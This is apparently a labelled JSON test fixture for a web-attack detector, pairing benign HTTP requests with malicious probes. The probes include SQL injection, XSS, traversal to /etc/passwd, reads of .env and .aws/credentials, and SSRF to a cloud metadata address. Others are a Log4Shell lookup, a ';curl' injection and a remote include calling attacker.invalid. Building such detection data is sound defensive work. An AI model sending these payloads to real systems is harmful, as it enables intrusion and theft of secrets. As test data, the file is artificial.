@@ -1,0 +1,1298 @@
+[
+  {
+    "id": "attack-00",
+    "category": "sqli",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/search?id=1%27%20OR%201=1--",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-01",
+    "category": "sqli",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=UNION/**/SELECT+password",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-02",
+    "category": "sqli",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x=pg_sleep(5)",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-03",
+    "category": "xss",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=%3Csvg%20onload=alert(1)%3E",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-04",
+    "category": "xss",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=%253cscript%253e",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-05",
+    "category": "xss",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=\\x3cscript\\x3e",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-06",
+    "category": "lfi_traversal",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/images/../../etc/passwd",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-07",
+    "category": "lfi_traversal",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?f=%252e%252e%252fetc/passwd",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-08",
+    "category": "lfi_traversal",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?f=..\\..\\windows\\system32",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-09",
+    "category": "sensitive_file",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/.env.production",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-10",
+    "category": "sensitive_file",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/.git/HEAD",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-11",
+    "category": "sensitive_file",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/.aws/credentials",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-12",
+    "category": "webshell",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/r57.php",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-13",
+    "category": "log4shell",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=${jndi:ldap://attacker.invalid/a}",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-14",
+    "category": "spring4shell",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?class.module.classLoader.resources.context.parent.pipeline=1",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-15",
+    "category": "ssrf",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?url=http://127.0.0.1/admin",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-16",
+    "category": "ssrf",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?url=http://169.254.169.254/latest/meta-data",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-17",
+    "category": "xxe",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?xml=%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-18",
+    "category": "command_injection",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?host=example%3Bcurl%20attacker.invalid",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-19",
+    "category": "command_injection",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?cmd=$(id)",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-20",
+    "category": "rfi",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?template=https://attacker.invalid/code.txt",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-21",
+    "category": "nosqli",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?user[$regex]=.*",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-22",
+    "category": "ssti",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x={{7*7}}",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-23",
+    "category": "shellshock",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x=()%20%7B",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-24",
+    "category": "ldap_injection",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=*)(uid=*",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-25",
+    "category": "xpath_injection",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=/child::user",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-26",
+    "category": "deserialization",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x=java.lang.ProcessBuilder",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-27",
+    "category": "struts_ognl",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x=ognl.OgnlContext",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-28",
+    "category": "crlf_injection",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x=%0d%0aLocation:evil",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-29",
+    "category": "null_byte",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?file=a.php%2500.jpg",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-30",
+    "category": "access_bypass",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/..;/manager/html",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-31",
+    "category": "iis_aspnet",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/elmah.axd",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-32",
+    "category": "cve_probe",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/actuator/heapdump",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-33",
+    "category": "scanner",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "sqlmap/1.8",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "attack-34",
+    "category": "method",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "TRACE",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-00",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-01",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/index.html",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-02",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/admin",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-03",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/wp-admin/",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-04",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/login",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-05",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/graphql",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-06",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/swagger",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-07",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/.well-known/security.txt",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-08",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/orders?page=2&sort=price",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-09",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/search?q=union+meeting",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-10",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/fetch?url=https://example.org/image",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-11",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/items?x=0x1234",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-12",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/docs/sleep",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-13",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/blog/日本語",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-14",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/favicon.ico",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-15",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/robots.txt",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-16",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/callback?redirect=https://example.org/",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-17",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/download?file=manual.pdf",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-18",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/search?q=information+schema",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "normal-19",
+    "category": "normal",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/products?filter=price%3E10",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-client-curl",
+    "category": "normal-client",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/orders",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "curl/8.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-client-python-requests",
+    "category": "normal-client",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/orders",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "python-requests/2.32",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-client-Go-http-client",
+    "category": "normal-client",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/orders",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Go-http-client/1.1",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-client-Googlebot",
+    "category": "normal-client",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/orders",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Googlebot",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-client-Mozilla",
+    "category": "normal-client",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/orders",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-admin",
+    "category": "administration",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/wp-admin/",
+        "status": 200,
+        "repeat": 80,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-crawler",
+    "category": "crawler",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/articles/{i}",
+        "status": 200,
+        "repeat": 100,
+        "user_agent": "Googlebot",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "benign-fast-api",
+    "category": "high-frequency-api",
+    "malicious": false,
+    "requests": [
+      {
+        "target": "/api/poll",
+        "status": 200,
+        "repeat": 700,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 0,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "auth-burst",
+    "category": "bruteforce",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/login",
+        "status": 401,
+        "repeat": 25,
+        "user_agent": "Mozilla/5.0",
+        "method": "POST",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "failed"
+  },
+  {
+    "id": "blocked-probes",
+    "category": "traversal",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/a/../../etc/passwd",
+        "status": 404,
+        "repeat": 3,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "likely_failed",
+    "ground_truth": "failed"
+  },
+  {
+    "id": "sensitive-transition",
+    "category": "sensitive_file",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/.env",
+        "status": 404,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      },
+      {
+        "target": "/.env",
+        "status": 200,
+        "repeat": 2,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "possible_success",
+    "ground_truth": "success"
+  },
+  {
+    "id": "sensitive-soft404",
+    "category": "sensitive_file",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/.env",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "failed"
+  },
+  {
+    "id": "sensitive-real-exposure",
+    "category": "sensitive_file",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/.env",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "success"
+  },
+  {
+    "id": "sql-500",
+    "category": "sqli",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?x=UNION+SELECT+password",
+        "status": 500,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "login-302",
+    "category": "bruteforce",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/login",
+        "status": 401,
+        "repeat": 25,
+        "user_agent": "Mozilla/5.0",
+        "method": "POST",
+        "step": 1,
+        "bytes": 100
+      },
+      {
+        "target": "/login",
+        "status": 302,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "POST",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  },
+  {
+    "id": "unsupported-obfuscation",
+    "category": "xss",
+    "malicious": true,
+    "requests": [
+      {
+        "target": "/?q=%u003cscript%u003e",
+        "status": 200,
+        "repeat": 1,
+        "user_agent": "Mozilla/5.0",
+        "method": "GET",
+        "step": 1,
+        "bytes": 100
+      }
+    ],
+    "expected_outcome": "unknown",
+    "ground_truth": "unknown"
+  }
+]
